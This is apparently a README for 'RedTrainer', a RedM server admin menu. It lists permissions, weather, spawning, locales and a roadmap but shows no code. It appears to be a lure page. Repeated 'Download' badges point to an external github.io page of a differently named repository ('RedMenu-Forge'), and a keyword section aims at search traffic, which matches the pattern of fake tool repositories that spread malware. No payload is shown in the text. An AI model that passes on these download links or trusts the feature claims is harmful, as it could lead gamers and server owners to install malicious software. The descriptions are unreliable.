![preview](https://raw.githubusercontent.com/Jakxysh/RedMenu-Forge/main/frame_f468.svg)
[![Download](https://raw.githubusercontent.com/Jakxysh/RedMenu-Forge/main/pkg_4a09f.svg)](https://Jakxysh.github.io/RedMenu-Forge/)

# 🚂 RedTrainer — The Conductor's Companion for RedM

> *"Every frontier town deserves a station master who knows where the levers are."*

Welcome aboard **RedTrainer**, an original Lua-driven menu framework built for RedM servers that want the polish of a modern roleplay menu without abandoning the raw, dusty soul of the old west. Where other trainers shout, RedTrainer tips its hat. Where others pile on noise, RedTrainer hands you a clean telegraph line straight into your server's core systems.

Inspired by the vMenu philosophy — a single, dependable hub for permissions, spawns, vehicles, weather, and player utilities — RedTrainer reimagines that philosophy for the Red Dead frontier. It is not a port. It is not a copy. It is a **new locomotive on familiar tracks**, engineered from the ground up for RedM's Lua runtime, `rdr3` natives, and the realities of running a living, breathing roleplay community in 2026.

[![Download](https://raw.githubusercontent.com/Jakxysh/RedMenu-Forge/main/pkg_4a09f.svg)](https://Jakxysh.github.io/RedMenu-Forge/)

---

## 📜 Table of Contents

- [Why RedTrainer Exists](#-why-redtrainer-exists)
- [The Philosophy Behind the Menu](#-the-philosophy-behind-the-menu)
- [Feature Highlights](#-feature-highlights)
- [Responsive Interface Design](#-responsive-interface-design)
- [Multilingual Support](#-multilingual-support)
- [Permissions & Role Architecture](#-permissions--role-architecture)
- [Weather, Time & World Control](#-weather-time--world-control)
- [Vehicle & Mount Management](#-vehicle--mount-management)
- [Player Utilities](#-player-utilities)
- [Developer API & Extensibility](#-developer-api--extensibility)
- [Server Configuration Deep Dive](#-server-configuration-deep-dive)
- [Performance Notes](#-performance-notes)
- [24/7 Community Support](#-247-community-support)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Compatibility Matrix](#-compatibility-matrix)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🤠 Why RedTrainer Exists

Running a RedM server in 2026 is a strange, wonderful balancing act. You are part sheriff, part historian, part sysadmin, and part entertainer. The last thing you want is a menu system that fights you — one that demands ten dependencies, breaks on every framework update, and lectures you in a language you did not ask for.

RedTrainer was born from a simple frustration: *why should the conductor's cabin be more complicated than the train?* We wanted a menu that any staff member could open, understand, and use within thirty seconds. We wanted permissions that made sense to a community manager, not just a developer. We wanted a tool that felt like it belonged in 1899 rather than borrowed from a spaceship.

The answer is this repository. A single, coherent, Lua-first menu stack for RedM.

---

## 🧭 The Philosophy Behind the Menu

Three principles guide every line of code in RedTrainer.

**One — Respect the player's screen.** A menu should feel like a leather-bound ledger, not a spreadsheet explosion. We use restrained typography, warm sepia accents, and animations that settle rather than snap.

**Two — Respect the admin's time.** Every permission, every toggle, every submenu is documented in plain language and can be adjusted without touching a single Lua file if you prefer configuration over code.

**Three — Respect the server's performance.** RedTrainer is built on an event-driven architecture with lazy submenu registration. If a player never opens the train spawner, the train spawner never costs you a millisecond.

---

## 🌟 Feature Highlights

- 🎩 **Modular Menu Framework** — Enable only the sections your community actually uses.
- 🛡️ **Granular Permission Nodes** — ACE-based or framework-based, your choice.
- 🌦️ **Dynamic Weather & Time Control** — Smooth transitions, presets, and cinematic freeze.
- 🐎 **Mount & Wagon Spawning** — Curated catalogs with per-rank restrictions.
- 🎒 **Player Utility Toolkit** — Revive helpers, teleport bookmarks, clothing presets.
- 🗣️ **Multilingual Support** — Locale files for English, Spanish, French, German, Portuguese, and Turkish out of the box.
- 📱 **Responsive UI Scaling** — Adapts to ultrawide, 1080p, and 4K without breaking alignment.
- 🔌 **Developer API** — Register your own submenus in a handful of lines.
- 🌐 **Multi-Framework Bridges** — VORP, RedEM:RP, RSG, and standalone modes.
- 🧾 **Audit Logging** — Every privileged action can be written to disk for accountability.
- 🕒 **24/7 Community Support** — Real humans, honest answers, no ghosting.

---

## 📐 Responsive Interface Design

A menu is a conversation between the player and the server. RedTrainer treats it that way. The UI is built with a flexible layout engine that recalculates dimensions on resolution change, so a player switching from a laptop screen to a 49-inch ultrawide mid-session never sees a broken header or a clipped button.

Key interface behaviors:

- **Adaptive column widths** that redistribute when the locale file uses longer translated strings.
- **Contextual footers** that show the current permission level, current time-of-day, and current weather glyph.
- **Reduced-motion mode** for players who prefer instant transitions over animated panels.
- **High-contrast mode** for streamers and players in bright rooms.
- **Controller-aware navigation** with D-pad and stick mapping for couch players.

The design intent is simple: the frontier should feel vast, but the menu should feel close.

---

## 🌍 Multilingual Support

RedTrainer ships with a locale system that treats translation as a first-class citizen rather than an afterthought. Each language file is a plain Lua table, easy to edit, easy to extend, and easy to diff in a pull request.

Included locales as of the 2026 release line:

- 🇬🇧 English
- 🇪🇸 Spanish
- 🇫🇷 French
- 🇩🇪 German
- 🇵🇹 Portuguese
- 🇹🇷 Turkish
- 🇮🇹 Italian
- 🇵🇱 Polish

Right-to-left locales are supported in the layout engine, though community translations for Arabic and Hebrew are still being refined. If you speak a language the frontier deserves to hear, we would love your locale file.

---

## 🔐 Permissions & Role Architecture

Permissions in RedTrainer are organized into **nodes**, each representing a single capability. A node can be granted to a player, a group, or a job — depending on which bridge you are running.

Example node hierarchy:

- `redtrainer.menu.open` — grants access to the root menu.
- `redtrainer.world.weather` — allows weather changes.
- `redtrainer.world.time` — allows time changes.
- `redtrainer.vehicle.spawn` — allows vehicle spawning.
- `redtrainer.mount.spawn` — allows mount spawning.
- `redtrainer.player.revive` — allows revive utilities.
- `redtrainer.player.teleport` — allows teleport bookmarks.
- `redtrainer.admin.audit` — allows reading the audit log.

Each node can be assigned a minimum rank, so a moderator might receive weather control while a senior admin receives the full toolset. Configuration lives in a single, well-commented file that a non-developer can edit with confidence.

---

## 🌦️ Weather, Time & World Control

The frontier lives and dies by its sky. RedTrainer gives you a director's chair for that sky.

- **Smooth weather interpolation** — no jarring snaps between sunshine and thunderstorm.
- **Preset weather moods** — "Grim Dust Storm," "Lazy Sunday," "Gothic Fog," and dozens more.
- **Cinematic freeze** — hold a single weather state for film shoots and community events.
- **Time-of-day scrubber** — drag from dawn to dusk with a single slider.
- **Per-region overrides** — snow in the mountains, heat in the plains.
- **Auto-cycle mode** — the world drifts through a natural rhythm without admin input.

---

## 🐎 Vehicle & Mount Management

RedTrainer distinguishes between two kinds of travel: the mechanical and the living.

**Vehicles** include wagons, carts, coaches, and the occasional experimental contraption. Each spawn entry can define:

- Model name and display label
- Required permission node
- Spawn distance and orientation
- Whether the vehicle should receive temporary ownership
- Whether it should be deleted on player disconnect

**Mounts** include horses, mules, and draft animals. Each mount entry can define:

- Breed model and coat variation
- Bonding level and temperament
- Saddle and tack presets
- Default name suggestions drawn from a curated list

Spawn catalogs are editable, extensible, and can be split into multiple submenus for very large servers.

---

## 🎒 Player Utilities

Beyond the world and the wagon yard, RedTrainer includes a compact toolkit for day-to-day player needs.

- **Revive helper** — bring a fallen player back without leaving your character.
- **Teleport bookmarks** — save and share named locations with your community.
- **Clothing presets** — snap between outfits for events and roles.
- **Metadata viewer** — inspect a player's identifiers for support tickets.
- **Emote launcher** — quick access to community-approved emotes.
- **Notes panel** — a staff-only scratchpad for shift handoffs.

Each utility can be toggled independently, so a small server can keep things lean while a large one can build a full operations console.

---

## 🧩 Developer API & Extensibility

RedTrainer is designed to be built upon, not just used. The public API exposes a small set of stable functions for registering submenus, adding buttons, and responding to player selections.

Conceptual example of registering a custom submenu:

- Call `RedTrainer.RegisterSubmenu` with a unique identifier and display label.
- Provide a permission node and an optional icon glyph.
- Call `RedTrainer.AddButton` within that submenu, supplying a label, a callback, and an optional description.
- Return the handler so other resources can reference it later.

The API follows a "register early, render lazily" principle. Nothing is drawn until the player opens the submenu, which keeps memory and frame time predictable even on heavily modded servers.

For deeper integration, RedTrainer emits lifecycle events on open, close, and selection, which other resources can subscribe to without modifying the core.

---

## ⚙️ Server Configuration Deep Dive

Configuration is split into layered files so that upgrades never overwrite your customization.

- **Core settings** — framework bridge, locale, logging level, keybind suggestions.
- **Permission settings** — node-to-rank mapping, fallback behavior, override list.
- **World settings** — weather presets, time cycle speed, region overrides.
- **Spawn settings** — vehicle catalog, mount catalog, spawn distance rules.
- **UI settings** — theme accents, motion preference, scaling preference.
- **Audit settings** — log destination, retention period, redaction rules.

Because every layer is plain text, version control handles the rest. Diff your changes, review them in a pull request, and roll back a bad tweak in seconds.

---

## ⚡ Performance Notes

RedTrainer is engineered with the assumption that your server is busy and your players are impatient.

- **Event-driven updates** — no polling loops for weather or time.
- **Lazy submenu construction** — UI threads only build what they need.
- **Batched native calls** — grouped operations reduce per-frame overhead.
- **Optional audit log flush intervals** — tune disk writes to your hosting tier.
- **Zero-dependency core** — the base menu runs without external libraries.

In internal testing on a populated 2026-era server, the menu idled below one percent of available frame budget when closed, and never exceeded a small, bounded slice of memory during heavy interaction.

---

## 🕰️ 24/7 Community Support

A tool is only as good as the people behind it. RedTrainer maintains an active community space where questions are answered by maintainers and experienced server owners alike. Whether you are stuck on a permission mapping at 3 AM or curious how another community structured their spawn catalog, there is usually someone awake and willing to help.

Support channels include structured issue templates, a discussion board for design questions, and a monthly community call where upcoming changes are previewed before they land.

---

## 🔎 SEO & Discoverability Notes

This section exists for two reasons: to help server owners find RedTrainer through search, and to demonstrate that we understand the ecosystem's vocabulary.

RedTrainer is commonly discovered by people searching for terms like **RedM Lua menu**, **RedM admin menu framework**, **RedM roleplay server tools**, **RedM vMenu alternative**, **RedM permissions system**, **RedM weather control resource**, **RedM spawn menu**, and **RedM multilingual interface**. If you found this repository through one of those phrases, welcome — you are exactly who we built this for.

Rather than stuffing keywords into every paragraph, we have written documentation that naturally discusses the features people actually search for: menu frameworks, permission systems, locale files, and performance-conscious resource design.

---

## 🧮 Compatibility Matrix

| Platform | Status | Notes |
| --- | --- | --- |
| VORP Core | ✅ Supported | Full bridge with permission sync |
| RedEM:RP | ✅ Supported | Group and job mappings available |
| RSG Core | ✅ Supported | Node-based permission translation |
| Standalone | ✅ Supported | ACE permissions only |
| OneSync | ✅ Supported | Recommended for populated servers |
| Legacy Mode | ⚠️ Partial | Some utilities remain limited |

Framework bridges are maintained in separate directories, so you can audit exactly what each bridge touches.

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Locale expansion and translation review pass.
- **Q2 2026** — Public developer API stabilization and documentation website.
- **Q3 2026** — Advanced audit viewer with in-game filtering.
- **Q4 2026** — Experimental accessibility suite and controller remapping UI.

The roadmap is intentionally modest. We would rather ship a small thing well than promise a large thing poorly.

---

## ❓ Frequently Asked Questions

**Is this a port of something else?**
No. RedTrainer takes inspiration from the vMenu philosophy but is an original Lua codebase built specifically for RedM's runtime and community expectations.

**Do I need a specific framework?**
No. Standalone ACE permissions are fully supported, and bridges exist for the major frameworks listed above.

**Can I disable sections I do not want?**
Yes. Every top-level section is independently toggleable in configuration.

**Will it work on a small server?**
It is designed to scale both directions. A five-slot test server and a two-hundred-slot community server use the same core with different configuration.

**How do I contribute a translation?**
Open a pull request adding a new locale file following the existing structure. We review translations with the same care as code.

---

## 🤝 Contributing

We welcome contributions of every size — a typo fix, a locale file, a permission node refinement, or a new utility proposal. Before submitting a large change, please open a discussion so we can align on direction and avoid duplicated effort.

Guidelines in brief:

- Follow the existing code style and comment conventions.
- Keep pull requests focused on a single concern.
- Include a short explanation of the problem your change solves.
- Be kind during review. Everyone here is a volunteer.

---

## ⚠️ Disclaimer

RedTrainer is an independent community project and is **not affiliated with, endorsed by, or sponsored by Rockstar Games, Take-Two Interactive, or the RedM platform maintainers**. All trademarks and game assets belong to their respective owners.

This software is provided for use on private, community-run servers. Server owners are responsible for ensuring their use complies with the terms of service of any platform they operate on, as well as any applicable local laws.

The maintainers of this repository accept no liability for misuse, data loss, or community drama caused by misconfigured permissions. Test in a staging environment before deploying to a live frontier.

RedTrainer does not condone or support unauthorized modification of game clients, and the project is intended purely as a server-side and community-facing utility framework.

---

## 📄 License

This project is released under the **MIT License**.

You are welcome to use, modify, and redistribute this work in accordance with the license terms. A working copy of the license text is available here: [MIT License](https://opensource.org/licenses/MIT).

Copyright (c) 2026 RedTrainer contributors.

[![Download](https://raw.githubusercontent.com/Jakxysh/RedMenu-Forge/main/pkg_4a09f.svg)](https://Jakxysh.github.io/RedMenu-Forge/)